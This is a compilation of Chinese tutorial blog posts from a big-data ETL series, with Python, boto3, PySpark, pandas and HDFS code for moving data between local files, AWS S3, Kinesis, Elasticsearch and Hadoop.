文章大纲大数据ETL 系列文章简介简介与实例读写本地数据到aws s3upload csv to aws使用python 将本地文件写入s3读出kinesis 中数据

大数据ETL 系列文章简介
本系列文章主要针对ETL大数据处理这一典型场景，基于python语言使用Oracle、aws、Elastic search 、Spark 相关组件进行一些基本的数据导入导出实战，如：

oracle使用数据泵impdp进行导入操作。
aws使用awscli进行上传下载操作。
本地文件上传至aws es
spark dataframe录入ElasticSearch

等典型数据ETL功能的探索。
系列文章：
1.大数据ETL实践探索（1）---- python 与oracle数据库导入导出
2.大数据ETL实践探索（2）---- python 与aws 交互
3.大数据ETL实践探索（3）---- pyspark 之大数据ETL利器
4.大数据ETL实践探索（4）---- 之 搜索神器elastic search
5.使用python对数据库，云平台，oracle，aws，es导入导出实战
6.aws ec2 配置ftp----使用vsftp

本文主要介绍，使用python与典型云平台aws 进行交互的部分过程和经典代码
简介与实例
boto3 有了这个包，基本所有和aws 进行交互的库都可以搞定了
aws 云服务提供了一些基础到高端的组合帮助我们更好的进行交付，实现自己的想法。 我看过最经典的例子莫过于
利用 AWS Comprehend 打造近实时文本情感分析

来自aws 官方技术博客的
下面我们给出一些典型例子和场景代码
读写本地数据到aws s3
upload csv to aws
使用awscli上传大文件，当然直接浏览器上传也行，但是好像超过4g会有问题。
Download Windows Installer
Https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/awscli-install-windows.html#awscli-install-windows-path
When installed, use
AWS --version

to confirm whether it is normal
Single file upload eg.
AWS S3 --region cn-north-1 CP CL_CLLI_LOG.csv s3://xxxx/csv/

You can use the notepad++'s block pattern, edit each table into a command, and execute the bat file in the CMD,like below:
aws s3 --region cn-north-1 cp LOG1.csv s3://xxxx/csv/ 
aws s3 --region cn-north-1 cp LOG2.csv s3://xxxx/csv/ 


使用python 将本地文件写入s3

def writeJsonToS3(json,aws_access_key,aws_secret_access_key):
    client = boto3.client('s3', 'cn',aws_access_key_id=aws_access_key, aws_secret_access_key=aws_secret_access_key)
    
    filename = "_".join(['result',datetime.datetime.now().strftime('%Y%m%d%H%M%S'),'score']) + '.csv'
        
        
    bucket_name  = '...'
    route = '...'
        
    client.put_object(Body=json,Bucket=bucket_name, Key=route + filename )
                          
    logger.info("score result Added to S3")
    file_url = "https://.../{0}/{1}".format(bucket_name,filename)
        
    logger.info(image_url)


读出kinesis 中数据

def get_stream_data(stream_name, limit, timedelta):
    
    client = boto3.client('kinesis', 'cn', aws_access_key_id='',aws_secret_access_key='')
    if stream_name:
        stream = client.describe_stream(StreamName=stream_name)['StreamDescription']

        for shard in stream['Shards']:
            print ("### %s - %s"%(stream_name, shard['ShardId']))
            shard_iterator = client.get_shard_iterator(
                StreamName=stream_name,
                ShardId=shard['ShardId'],
                ShardIteratorType='AT_TIMESTAMP',  #'TRIM_HORIZON'|'LATEST'
                Timestamp=datetime.datetime.utcnow() - datetime.timedelta(minutes=timedelta)
            )['ShardIterator']
            
            for i in range(0,1):
                out = client.get_records(ShardIterator=shard_iterator, Limit=limit)
                if out["Records"]:
                    for record in out["Records"]:
                        data = json.loads(record["Data"])
                        print (data)
                    break
                else:
                    print (out)

                    
    else:
        print ("Need stream name !!!")












文章大纲大数据ETL 系列文章简介pyspark Dataframe ETLspark dataframe 数据导入Elasticsearchdataframe 及环境初始化清洗及写入数据到Elastic searchspark SQLDataframe 操作加载大文件遍历增删改查空值处理更改dataframe 列 类型wherejoin 及聚集函数列式数据存储格式parquet参考

大数据ETL 系列文章简介
本系列文章主要针对ETL大数据处理这一典型场景，基于python语言使用Oracle、aws、Elastic search 、Spark 相关组件进行一些基本的数据导入导出实战，如：

oracle使用数据泵impdp进行导入操作。
aws使用awscli进行上传下载操作。
本地文件上传至aws es
spark dataframe录入ElasticSearch

等典型数据ETL功能的探索。
系列文章：
1.大数据ETL实践探索（1）---- python 与oracle数据库导入导出
2.大数据ETL实践探索（2）---- python 与aws 交互
3.大数据ETL实践探索（3）---- pyspark 之大数据ETL利器
4.大数据ETL实践探索（4）---- 之 搜索神器elastic search
5.使用python对数据库，云平台，oracle，aws，es导入导出实战
6.aws ec2 配置ftp----使用vsftp
7.浅谈pandas，pyspark 的大数据ETL实践经验

pyspark Dataframe ETL
本部分内容主要在 系列文章7 ：浅谈pandas，pyspark 的大数据ETL实践经验 上已有介绍 ，不用多说

spark dataframe 数据导入Elasticsearch
下面重点介绍 使用spark 作为工具和其他组件进行交互（数据导入导出）的方法
ES 对于spark 的相关支持做的非常好，https://www.elastic.co/guide/en/elasticsearch/hadoop/2.4/spark.html
在官网的文档中基本上说的比较清楚，但是大部分代码都是java 的，所以下面我们给出python 的demo 代码
dataframe 及环境初始化
初始化， spark 第三方网站下载包：elasticsearch-spark-20_2.11-6.1.1.jar
http://spark.apache.org/third-party-projects.html
import sys
import os
print(os.getcwd())
# 加载包得放在这里
os.environ['PYSPARK_SUBMIT_ARGS'] = '--jars elasticsearch-spark-20_2.11-6.1.1.jar pyspark-shell'

import os
from pyspark.sql import SparkSession
from pyspark import SparkConf
from pyspark.sql.types import *
from pyspark.sql import functions as F
from pyspark.storagelevel import StorageLevel
import json
import math
import numbers
import numpy as np
import pandas as pd

os.environ["PYSPARK_PYTHON"] = "/home/hadoop/anaconda/envs/playground_py36/bin/python"



try:
    spark.stop()
    print("Stopped a SparkSession")
except Exception as e:
    print("No existing SparkSession")

SPARK_DRIVER_MEMORY= "10G"
SPARK_DRIVER_CORE = "5"
SPARK_EXECUTOR_MEMORY= "3G"
SPARK_EXECUTOR_CORE = "1"


conf = SparkConf().\
        setAppName("insurance_dataschema").\
        setMaster('yarn-client').\
        set('spark.executor.cores', SPARK_EXECUTOR_CORE).\
        set('spark.executor.memory', SPARK_EXECUTOR_MEMORY).\
        set('spark.driver.cores', SPARK_DRIVER_CORE).\
        set('spark.driver.memory', SPARK_DRIVER_MEMORY).\
        set('spark.driver.maxResultSize', '0').\
        set("es.index.auto.create", "true").\
        set("es.resource", "tempindex/temptype").\
        set("spark.jars", "elasticsearch-hadoop-6.1.1.zip")  # set the spark.jars
    
        
spark = SparkSession.builder.\
    config(conf=conf).\
    getOrCreate()

sc=spark.sparkContext
hadoop_conf = sc._jsc.hadoopConfiguration()

hadoop_conf.set("mapreduce.fileoutputcommitter.algorithm.version", "2")

清洗及写入数据到Elastic search

数据加载

#数据加载
df = (spark
                 .read
                 .option("header","true")
                 .option("multiLine", "true")
                 .csv('EXPORT.csv')
                 .cache()
                )
print(df.count())


#


数据清洗，增加一列，或者针对某一列进行udf 转换

'''  
#加一列用户名，如果是xx数据则为xx
'''

from pyspark.sql.functions import udf


from pyspark.sql import functions
df = df.withColumn('customer',functions.lit("腾讯用户"))


使用udf 清洗时间格式及数字格式

#udf 清洗时间
#清洗日期格式字段
from dateutil import parser

def clean_date(str_date):
    try:
        if str_date:
            d = parser.parse(str_date)
            return d.strftime('%Y-%m-%d')
        else:
            return None
    except Exception as e:
         return None
        


func_udf_clean_date = udf(clean_date, StringType())

def is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        pass
    return False

def clean_number(str_number):

    try:
        if str_number:

                if is_number(str_number):
                    return str_number
                else:
                    None
        else:
            return None
    except Exception as e:
        return None




func_udf_clean_number = udf(clean_number, StringType())

column_Date = [
"DATE_FROM",
"DATE_TO",
]


for column in column_Date:
      df=df.withColumn(column,  func_udf_clean_date(df[column]))

df.select(column_Date).show(2)


#数据写入

df.write.format("org.elasticsearch.spark.sql").\
option("es.nodes", "IP").\
option("es.port","9002").\
mode("Overwrite").\
save("is/doc")


spark SQL
SPARK 的spark 写起来对于 经常写sql 的人来说还是很友好的
一份代码样例如下，参考：update a dataframe column with new values


data1 = [
  (1, "a"),
  (2, "b"),
  (3, "c")
]
df1 = spark.createDataFrame(data1, ["id", "value"])

data2 = [
  (1, "x"), 
  (2, "y")
]

df2 = spark.createDataFrame(data2, ["id", "value"])

df1.registerTempTable('df1')
df2.registerTempTable('df2')

query = """SELECT l.id, 
CASE WHEN r.value IS NOT NULL THEN r.value ELSE l.value END AS value 
FROM df1 l LEFT JOIN df2 r ON l.id = r.id"""
spark.sql(query.replace("\n", "")).show()

# 样例输出
#+---+-----+
#| id|value|
#+---+-----+
#|  1|    x|
#|  3|    c|
#|  2|    y|
#+---+-----+


spark SQL 中，语句包含中文列名怎么处理呢，以下给出一个样例：
    query = """SELECT df1.`体检ID`,df1.`体检编号`,df1.`性别`,df1.`年龄`,df1.`检查日期`,"""+str_sql_column+"""
    CASE WHEN df2.`结果` IS NOT NULL THEN df2.`结果` ELSE df1."""+'`'+jieguo+'`'+""" END AS """+'`'+jieguo+'`'+""" ,
    CASE WHEN df2.`异常与否` IS NOT NULL THEN df2.`异常与否` ELSE df1."""+'`'+yichangyufou+'`'+"""  END AS """+'`'+yichangyufou+'`'+""" 
    FROM df1 LEFT JOIN df2 ON df1.`体检ID` = df2.`体检ID`"""

Dataframe 操作
http://spark.apache.org/docs/latest/api/python/pyspark.sql.html
加载大文件
遍历
按行遍历

# DataFrame转list
rows=df.collect()
cols=df.columns

cols_len=len(cols)
all_list=[]

for row in rows:
	'do your job'


这样遍历获取到的 row 是<class ‘pyspark.sql.types.Row’> 类型。 我们可以通过 (row[key]) 获取到对应的键值。
http://spark.apache.org/docs/latest/api/python/pyspark.sql.html#pyspark.sql.Row
增
删
改
查
空值处理
dataframe 的空值可以直接使用 fillna 函数进行处理
Replace null values, alias for na.fill(). DataFrame.fillna() and DataFrameNaFunctions.fill() are aliases of each other.
# 计算dataframe 每一列缺失值的百分比
from pyspark.sql import functions as F
df.agg(*[(1-(F.count(c) /F.count('*'))).alias(c+'_missing') for c in df.columns]).show()

输出：
+----------+---------------+------------------------+
|id_missing|disease_missing|           label_missing|
+----------+---------------+------------------------+
|       0.0|            0.0|                     0.0|
+----------+---------------+------------------------+

更改dataframe 列 类型
# 可以这么写
from pyspark.sql.types import DoubleType

changedTypedf = joindf.withColumn("label", joindf["show"].cast(DoubleType()))

# 或者这么写：

changedTypedf = joindf.withColumn("label", joindf["show"].cast("double"))

至于每种类型怎么对应

where canonical string names (other variations can be supported as well) correspond to simpleString value. So for atomic types:

from pyspark.sql import types 

for t in ['BinaryType', 'BooleanType', 'ByteType', 'DateType', 
          'DecimalType', 'DoubleType', 'FloatType', 'IntegerType', 
           'LongType', 'ShortType', 'StringType', 'TimestampType']:
    print(f"{t}: {getattr(types, t)().simpleString()}")


BinaryType: binary
BooleanType: boolean
ByteType: tinyint
DateType: date
DecimalType: decimal(10,0)
DoubleType: double
FloatType: float
IntegerType: int
LongType: bigint
ShortType: smallint
StringType: string
TimestampType: timestamp

说实话，spark 的文档 cast api 的介绍 写的还没人家这个回答好
参考：https://stackoverflow.com/questions/32284620/how-to-change-a-dataframe-column-from-string-type-to-double-type-in-pyspark
where
like 操作怎么写都不对, 原来是对象的方法
like(other)
SQL like expression. Returns a boolean Column based on a SQL LIKE match.
Parameters:	other – a SQL LIKE pattern
See rlike() for a regex version
>>>
df.filter(df.name.like('Al%')).collect()
[Row(age=2, name='Alice')]

join 及聚集函数
join:
groupBy：https://spark.apache.org/docs/latest/api/python/pyspark.sql.html?highlight=groupby#pyspark.sql.DataFrame.groupby

df.groupBy('name').agg({'age': 'mean'})

下面给出一个 简单使用聚集函数统计 的样例代码：
# 以下代码实现，和代码表碰撞获取代码中文名称，并统计不同项目的占比功能

门诊住院分布_df = df.groupby("TYPE"
				).agg(F.count(df.OID).alias('个数'))

门诊住院分布_df =门诊住院分布_df.orderBy(F.desc("个数")
				).join(code_lang_df,code_lang_df.SCMA_OID == 门诊住院分布_df.TYPE
					).select(门诊住院分布_df.TYPE,门诊住院分布_df.个数,code_lang_df.CODE_DESC)

门诊住院分布_pdf = 门诊住院分布_df.toPandas()

门诊住院分布_pdf['比例'] = 门诊住院分布_pdf['个数']/门诊住院分布_pdf['个数'].sum()

#取前十个
门诊住院分布_pdf[0:10]




列式数据存储格式parquet
parquet 是针对列式数据存储的一种申请的压缩格式，百万级的数据用spark 加载成pyspark 的dataframe  然后在进行count 操作基本上是秒出结果
读写 demo code
#直接用pyspark dataframe写parquet数据（overwrite模式）
df.write.mode("overwrite").parquet("data.parquet")

# 读取parquet 到pyspark dataframe，并统计数据条目

DF = spark.read.parquet("data.parquet")
DF.count()


Parquet 用于 Spark SQL 时表现非常出色。它不仅提供了更高的压缩率，还允许通过已选定的列和低级别的读取器过滤器来只读取感兴趣的记录。因此，如果需要多次传递数据，那么花费一些时间编码现有的平面文件可能是值得的。

参考
parquet
https://www.ibm.com/developerworks/cn/analytics/blog/5-reasons-to-choose-parquet-for-spark-sql/index.html
parquet 实战应用
http://www.cnblogs.com/piaolingzxh/p/5469964.html










文章大纲大数据ETL 系列文章简介本地文件导入aws Elastic search网络配置环境配置数据录入并行录入Elastic search 基本命令

大数据ETL 系列文章简介
本系列文章主要针对ETL大数据处理这一典型场景，基于python语言使用Oracle、aws、Elastic search 、Spark 相关组件进行一些基本的数据导入导出实战，如：

oracle使用数据泵impdp进行导入操作。
aws使用awscli进行上传下载操作。
本地文件上传至aws es
spark dataframe录入ElasticSearch

等典型数据ETL功能的探索。
系列文章：
1.大数据ETL实践探索（1）---- python 与oracle数据库导入导出
2.大数据ETL实践探索（2）---- python 与aws 交互
3.大数据ETL实践探索（3）---- pyspark 之大数据ETL利器
4.大数据ETL实践探索（4）---- 之 搜索神器elastic search
5.使用python对数据库，云平台，oracle，aws，es导入导出实战
6.aws ec2 配置ftp----使用vsftp
7.浅谈pandas，pyspark 的大数据ETL实践经验

本地文件导入aws Elastic search
网络配置
修改访问策略，设置本地电脑的公网ip，这个经常会变化，每次使用时候需要设置一下

环境配置
安装anancota
https://www.anaconda.com/download/
初始化环境，win10下打开Anaconda Prompt 的命令行

conda create -n elasticsearch python=3.6
source activate elasticsearch 
pip install elasticsearch
pip install pandas



数据录入
如果突然来了一批非常大的数据要录入到Elastic search 中怎么办。
使用脚本如下：windows获取当前文件夹下所有csv并转换成pandas 的dataframe建立索引录入Elastic search

# 有问题的并行数据录入代码
from elasticsearch import helpers, Elasticsearch
import pandas as pd
from time import time

import win_unicode_console
win_unicode_console.enable()

import os  
  
def file_name(file_dir):   
    for root, dirs, files in os.walk(file_dir):  
        print(root) #当前目录路径  
        print(dirs) #当前路径下所有子目录  
        print(files) #当前路径下所有非目录子文件  
        return [item for item in files if '.csv' in item]


root_path=os.getcwd()+'\\'

fileslist = file_name(root_path)

# size of the bulk
chunksize=50000

for file in fileslist:
    t0=time()
    f = open(root_path+file,'r', encoding='UTF-8') # read csv

    # 使用 pandas 解析csv
    csvfile=pd.read_csv(f, iterator=True, chunksize=chunksize,low_memory=False) 

    # 初始化es
    es = Elasticsearch(["https://yoururl.amazonaws.com.cn"])

    # 初始化索引
    try :
        es.indices.delete(file.strip('.csv').lower())
    except :
        pass

    es.indices.create(file.strip('.csv').lower())

    # start bulk indexing 
    print("now indexing %s..."%(file))

    for i,df in enumerate(csvfile): 
        print(i)
        records=df.where(pd.notnull(df), None).T.to_dict()
        list_records=[records[it] for it in records]
        try :
            helpers.parallel_bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower(),thread_count=8)
        except :
            print("error!, skip records...")
            pass

    print("done in %.3fs"%(time()-t0))


并行录入
上一段代码发现，数据录入es时候有问题，由于并行录入是懒加载的模式，所以数据居然没录进去，按照下面链接提供的思路，代码需要如下修改：
代码实例：
https://www.programcreek.com/python/example/104891/elasticsearch.helpers.parallel_bulk
参考帖子：
https://discuss.elastic.co/t/helpers-parallel-bulk-in-python-not-working/39498

from elasticsearch import helpers, Elasticsearch
import pandas as pd
from time import time

from elasticsearch.helpers import BulkIndexError
from elasticsearch.exceptions import TransportError,ConnectionTimeout,ConnectionError
import traceback  
import logging
logging.basicConfig(filename='log-for_.log',
                    format='%(asctime)s -%(name)s-%(levelname)s-%(module)s:%(message)s',
                    datefmt='%Y-%m-%d %H:%M:%S %p',
                    level=logging.ERROR)


import win_unicode_console
win_unicode_console.enable()

import os  
  
def file_name(file_dir):   
    for root, dirs, files in os.walk(file_dir):  
        print(root) #当前目录路径  
        print(dirs) #当前路径下所有子目录  
        print(files) #当前路径下所有非目录子文件  
        return [item for item in files if '.csv' in item]

#NAME = "PV_PROV_LOG"
root_path=os.getcwd()+'\\'
#csv_filename="%s.csv" % NAME



fileslist = file_name(root_path)

# size of the bulk
chunksize=1000

for file in fileslist:

    t0=time()
    # open csv file
    
    f = open(root_path+file,'r', encoding='UTF-8') # read csv

    # parse csv with pandas
    csvfile=pd.read_csv(f, iterator=True, chunksize=chunksize,low_memory=False) 

    # init ElasticSearch
    es = Elasticsearch(["..."])

    # init index
    try :
        es.indices.delete(file.strip('.csv').lower())
    except :
        pass

    es.indices.create(file.strip('.csv').lower())

    # start bulk indexing 
    print("now indexing %s..."%(file))

    for i,df in enumerate(csvfile): 
        print(i)
        records=df.where(pd.notnull(df), None).T.to_dict()
        list_records=[records[it] for it in records]
        #print(list_records)
        try :
            #helpers.bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower())
            for success, info in helpers.parallel_bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower(),thread_count=8):
                if not success:
                    print('A document failed:', info)
            #helpers.parallel_bulk(es, list_records, index=file.strip('.csv').lower(), doc_type=file.strip('.csv').lower(),thread_count=8)
        except ConnectionTimeout:
            logging.error("this is ES ConnectionTimeout ERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
        except TransportError:
            
            logging.error("this is ES TransportERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
        except ConnectionError:
            logging.error("this is ES ConnectionError ERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
            
        except BulkIndexError:
            logging.error("this is ES BulkIndexError ERROR \n %s"%str(traceback.format_exc()))
            logging.info('retry bulk es')
            pass
        except Exception:
            logging.error("exception not match \n %s"%str(traceback.format_exc()))
            logging.error('retry bulk es')
            pass
        except :
            print("error!, skiping some records")
            print (list_records)
            print(json.loads(result))
            pass

    print("done in %.3fs"%(time()-t0))



Elastic search 基本命令
使用curl 命令发送查询请求
#获取索引记录条数
curl -X GET 172.31.45.69:9200/index/doc/_count

结果
{"count":155000,"_shards":{"total":5,"successful":5,"skipped":0,"failed":0}}











文章大纲官方文档及权威参考文档其他权威参考文件加载csv文件加载xlsx、xls文件加载添加数据列apply 函数作用生成新列报错索引的那些坑DataFrame创建遍历增按照列增加按照行增加删改查保存数据清洗1. 删除多列数据2. 转换 Dtypes3. 将分类变量转换为数值变量4. 检查缺失的数据5. 删除列中的字符串6. 删除列中的空格7. 将两列字符串数据（在一定条件下）拼接起来8. 转换时间戳（从字符串类型转换为日期「DateTime」格式）探索性数据分析百分比计算数据可视化中文显示参考教程杂项pandas 将某一列移动到最前面jupyter notebook 技巧pandas 在jupyter 中显示所有行和列 及内容多行显示代码自动补全参考

官方文档及权威参考
文档
官网：http://pandas.pydata.org/pandas-docs/stable/
中文文档
其他权威参考
最近看到的python 杰出的自学资料这个项目里面的例子基本都是开源领域的大咖写的，让你用不到500行的Python代码实现一个非常牛逼实用的功能。
比如说做一个Python解释器，在比如说做一个光学文字识别系统。听起来就非常高大上。然后500行以内就能搞定，但是这个项目肯定需要大家有了一定水平之后才能去研究了。
链接：
http://aosabook.org/en/index.html

文件加载
csv文件加载
read_csv
path = r'./data/ren_pd.csv'

df_pifu = pd.read_csv(path,low_memory=False,dtype={'MBR_NO':np.str})

##文件不规则，行尾有分隔符，则可以设定index_col=False 来是的pandas不适用第一列作为行索引。

head_name = ["体检ID","体检编号"]

tijian_pdf = pd.read_csv(path_tijian,encoding='utf-8',engine='python',dtype='object', skiprows =1,header=None,names=head_name)


官网参数解析：pandas.read_csv
xlsx、xls文件加载
pandas 使用第三方库对xlsx、xls 进行解析，可以使用的库有xlrd 或者openpyxl

所有 python 操作work with Excel files 的开源库
openpyxl 文档：https://openpyxl.readthedocs.io/en/stable/
xlrd 文档：https://xlrd.readthedocs.io/en/latest/

read_excel()方法使用Python的xlrd模块来读取Excel 2003（.xls)版的文件，而Excel 2007+ （.xlsx)版本的是用xlrd或者openpyxl模块来读取的。to_excel()方法则是用来把DataFrame数据存储为Excel格式。一般来说，它的语法同使用csv数据是类似的，更多高级的用法可以参考cookbook
测试数据 = '测试数据20200410.xlsx'
测试数据_pdf = pd.read_excel(测试数据,dtype=object)

官网文档 pandas.read_excel

添加数据列
apply 函数 文档
apply 函数作用生成新列报错
报错代码：
  mapped = lib.map_infer(values, f, convert=convert_dtype)

stackoverflow: 这个可能是空值引起的报错
那么显而易见的，从字典中获取数据，要判断异常，当然try/except代码是必须的，不过这里有一种简单方法，尝试在字典中找key，如果没有找到对应的value将用第二个参数设为其变量值。
data = { user : 1,  name :  Max ,  three : 4}
try:
   is_admin = data[ admin ]
except KeyError:
   is_admin = False

#替换成这样

data = { user : 1,  name :  Max ,  three : 4}
is_admin = data.get( admin , False)


索引的那些坑
# pandas groupby 之后都需要进行索引的重新设置
df_pifu["CNT"] = df_pifu["CODE_DESC"].apply(lambda x : 1)
df_pifu_疾病 = df_pifu.groupby(["CODE_DESC"])["CNT"].count().reset_index()
df_pifu_疾病 = df_pifu_疾病.sort_values(by=['CNT'],ascending = False).head(10)


DataFrame
文档：pandas DataFrame
参数inplace默认为False,只能在生成的新数据块中实现编辑效果。当inplace=True时执行内部编辑，不返回任何值，原数据发生改变。
还有一个操作需要大家注意就是，DataFrame 操作尽量按照列为单位进行操作，这样速度较快。
创建
# 创建一个空的 DataFrame
df_empty = pd.DataFrame(columns=['A', 'B', 'C', 'D'])

遍历

iterrows():  按行遍历，将DataFrame的每一行迭代为(index, Series)对，可以通过row[name]对元素进行访问。
itertuples():  按行遍历，将DataFrame的每一行迭代为元祖，可以通过row[name]对元素进行访问，比iterrows()效率高。
iteritems(): 按列遍历，将DataFrame的每一列迭代为(列名, Series)对，可以通过row[index]对元素进行访问。

#遍历每一行
for row in df.itertuples():
    ID = getattr(row, 'ID')

增
按照列增加
按照行增加
删
改
查
找到特定值的 行索引
df[df['row_name'] == value].index.tolist()

保存
保存为xls 表格：
new_file ="xxx.xls"
result_pdf.to_excel(new_file,'Sheet1', index=False)


数据清洗
在下面的代码片段中，数据清洗代码被封装在了一些函数中，代码的目的十分直观。你可以直接使用这些代码，无需将它们嵌入到需要进行少量参数修改的函数中。
1. 删除多列数据
def drop_multiple_col(col_names_list, df): 
    '''
    AIM    -> Drop multiple columns based on their column names 

    INPUT  -> List of column names, df

    OUTPUT -> updated df with dropped columns 
    ------
    '''
    df.drop(col_names_list, axis=1, inplace=True)
    return df

有时，并不是所有列的数据都对我们的数据分析工作有用。因此，「df.drop」可以方便地删掉你选定的列。
2. 转换 Dtypes

def change_dtypes(col_int, col_float, df): 
    '''
    AIM    -> Changing dtypes to save memory

    INPUT  -> List of column names (int, float), df

    OUTPUT -> updated df with smaller memory  
    ------
    '''
    df[col_int] = df[col_int].astype('int32')
    df[col_float] = df[col_float].astype('float32')


当我们面对更大的数据集时，我们需要对「dtypes」进行转换，从而节省内存。如果你有兴趣学习如何使用「Pandas」来处理大数据，我强烈推荐你阅读「Why and How to Use Pandas with Large Data」这篇文章（https://towardsdatascience.com/why-and-how-to-use-pandas-with-large-data-9594dda2ea4c）。
3. 将分类变量转换为数值变量
def convert_cat2num(df):
    # Convert categorical variable to numerical variable
    num_encode = {'col_1' : {'YES':1, 'NO':0},
                  'col_2'  : {'WON':1, 'LOSE':0, 'DRAW':0}}  
    df.replace(num_encode, inplace=True)  

有一些机器学习模型要求变量是以数值形式存在的。这时，我们就需要将分类变量转换成数值变量然后再将它们作为模型的输入。对于数据可视化任务来说，我建议大家保留分类变量，从而让可视化结果有更明确的解释，便于理解。
4. 检查缺失的数据
def check_missing_data(df):
    # check for any missing data in the df (display in descending order)
    return df.isnull().sum().sort_values(ascending=False)

如果你想要检查每一列中有多少缺失的数据，这可能是最快的方法。这种方法可以让你更清楚地知道哪些列有更多的缺失数据，帮助你决定接下来在数据清洗和数据分析工作中应该采取怎样的行动。
5. 删除列中的字符串
def remove_col_str(df):
    # remove a portion of string in a dataframe column - col_1
    df['col_1'].replace('\n', '', regex=True, inplace=True)

    # remove all the characters after &# (including &#) for column - col_1
    df['col_1'].replace(' &#.*', '', regex=True, inplace=True)

有时你可能会看到一行新的字符，或在字符串列中看到一些奇怪的符号。你可以很容易地使用 df[‘col_1’].replace 来处理该问题，其中「col_1」是数据帧 df 中的一列。
6. 删除列中的空格
def remove_col_white_space(df):
    # remove white space at the beginning of string 
    df[col] = df[col].str.lstrip()

当数据十分混乱时，很多意想不到的情况都会发生。在字符串的开头有一些空格是很常见的。因此，当你想要删除列中字符串开头的空格时，这种方法很实用。
7. 将两列字符串数据（在一定条件下）拼接起来
def concat_col_str_condition(df):
    # concat 2 columns with strings if the last 3 letters of the first column are 'pil'
    mask = df['col_1'].str.endswith('pil', na=False)
    col_new = df[mask]['col_1'] + df[mask]['col_2']
    col_new.replace('pil', ' ', regex=True, inplace=True)  # replace the 'pil' with emtpy space

当你希望在一定条件下将两列字符串数据组合在一起时，这种方法很有用。例如，你希望当第一列以某些特定的字母结尾时，将第一列和第二列数据拼接在一起。根据你的需要，还可以在拼接工作完成后将结尾的字母删除掉。
8. 转换时间戳（从字符串类型转换为日期「DateTime」格式）
def convert_str_datetime(df): 
    '''
    AIM    -> Convert datetime(String) to datetime(format we want)

    INPUT  -> df

    OUTPUT -> updated df with new datetime format 
    ------
    '''
    df.insert(loc=2, column='timestamp', value=pd.to_datetime(df.transdate, format='%Y-%m-%d %H:%M:%S.%f'))

在处理时间序列数据时，你可能会遇到字符串格式的时间戳列。这意味着我们可能不得不将字符串格式的数据转换为根据我们的需求指定的日期「datetime」格式，以便使用这些数据进行有意义的分析和展示

探索性数据分析
https://www.jianshu.com/p/8982ad63eb85

https://mp.weixin.qq.com/s?__biz=MjM5MTQzNzU2NA==&mid=2651667552&idx=1&sn=14e11d8ba698d92696cf4a125807564e&chksm=bd4c1bf38a3b92e507cc4464f6a8f90d92132f2af5a72f86939c826362ebfd4803fa39b4d66c&mpshare=1&scene=1&srcid=0209WG9hxbGM0awtUZcvl0dj#rd
百分比计算
比如直接由 spark dataframe 统计的结果转化成pandas 的dataframe 两列相除就好

#理赔金额最高大类
temp_top_df = tichu_df.select(tichu_df.MBR_NO,tichu_df.CODE,tichu_df.AMT
                        ).groupBy(tichu_df.CODE
                                 ).agg(F.sum(tichu_df.AMT
                                              ).alias('最多金额'))


temp_top_pdf = temp_top_df .orderBy(F.desc("最多金额")).toPandas()

temp_top_pdf ['百分比'] = temp_top_pdf ['最多金额大类']/temp_lipebigjibingjinetop_pdf['最多金额大类'].sum()



数据可视化
中文显示
pandas 处理完成数据后，大家经常使用的可视化库有matplotlib ，seaborn，pyecharts 等
前两个中文字体显示成问题，最后一个因为是国产库中文支持比较好但是在jupyter notebook中生成的结果是网页，图片不知道怎么显示出来。 以下参考链接为 我博客另一个系列中针对matplotlib ，seaborn中文显示问题的探讨：
以 matplotlib 为基础的库的可视化库的中文显示问题 
参考教程
https://tianchi.aliyun.com/course/courseDetail?courseId=261

杂项
pandas 将某一列移动到最前面
基本思想，首先获取这一列，删除，然后插入到最前面。

temp = orgin_file_pdf['code']

orgin_file_pdf.drop(labels=['code'], axis=1,inplace = True)
orgin_file_pdf.insert(0, 'code', temp)


jupyter notebook 技巧
设置宽幅显示
%load_ext autoreload
%autoreload 2


from IPython.core.display import display, HTML
display(HTML("<style>.container { width:100% !important; }</style>"))
# set up display area to show dataframe in jupyter qtconsole

import matplotlib
%matplotlib inline


pandas 在jupyter 中显示所有行和列 及内容
#显示列的条数
pd.set_option('max_columns',1000) 
#显示行的条数
pd.set_option('max_row',300) 
#显示数值的精度
pd.set_option('display.float_format', lambda x: '%.5f' % x)

#设置value的显示长度为100，默认为50
pd.set_option('max_colwidth',100)


多行显示
#支持多行输出
from IPython.core.interactiveshell import InteractiveShell 
InteractiveShell.ast_node_interactivity = 'all'

代码自动补全
#代码自动完成---运行过的内容加入代码提示
#import导入包也可以提示使用tab
%config IPCompleter.greedy=True



参考

机器知心：pandas 数据清洗工具框架代码（还在为数据清洗抓狂？这里有一个简单实用的清洗代码集）











文章大纲1. python 与hdfs 交互 回写1.1 使用hdfs 包1.2 python2 与hdfs1.3 在python中直接调用hadoop shell 命令去操作文件1.3.1 hadoop shell1.3.2 popen1.3.3 subprocess1.4 python 与 py4j 交互2. pyspark 与driver 磁盘交互3. python docker 搭建spark standalone 版本

1. python 与hdfs 交互 回写
1.1 使用hdfs 包
api list：https://hdfscli.readthedocs.io/en/latest/api.html#api-reference
获取hdfs data 文件夹下面所有csv 文件

from hdfs.client import Client
client = Client("http://IP:50070")  # 50070: Hadoop默认namenode
#返回目录下的文件
def list_file(client,hdfs_path):
    return client.list(hdfs_path, status=False)
#从hdfs获取文件到本地
def get_from_hdfs(client,hdfs_path,local_path):
    client.download(hdfs_path, local_path, overwrite=False,n_threads=1)
    
hdfs_path = r'/user/hadoop/data'
    
name_list = list_file(client,hdfs_path)
#过滤所有csv文件
name_list_csv  = [n for n in name_list if '.csv' in n]

print(name_list)
index = 1
for file in name_list_csv:
    get_from_hdfs(client,hdfs_path+'/'+file,os.path.join( os.getcwd()))
    os.rename(os.path.join(os.getcwd(),file),os.path.join(os.getcwd(),str(index)+".csv"))
    index = index+1
    

1.2 python2 与hdfs
python2 与hdfs交互的一些老方法可以参考这个博文
https://www.cnblogs.com/liyongsan/p/4987819.html
1.3 在python中直接调用hadoop shell 命令去操作文件
1.3.1 hadoop shell
写也可以先saveAsTextFile,然后使用hdfs命令存到本地, 使用hdfs fs -get命令：
